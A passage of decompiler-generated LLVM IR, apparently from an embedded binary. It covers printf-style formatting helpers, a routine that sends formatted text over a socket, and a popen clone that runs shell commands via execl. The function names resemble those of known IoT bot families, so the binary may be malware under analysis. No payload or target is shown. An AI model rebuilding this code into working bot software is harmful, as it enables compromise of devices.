  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c7f0.31, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2b2f0.33, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2b2f0.33, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp3, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1c7f8.35 to i32), i32 ptrtoint ([3 x i8]* @global_var_1c800.37 to i32), i32 ptrtoint ([3 x i8]* @global_var_1c804.39 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp3, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2b2f0.33, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2b2f0.33, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2b2f0.33, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_2b2f0.33, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
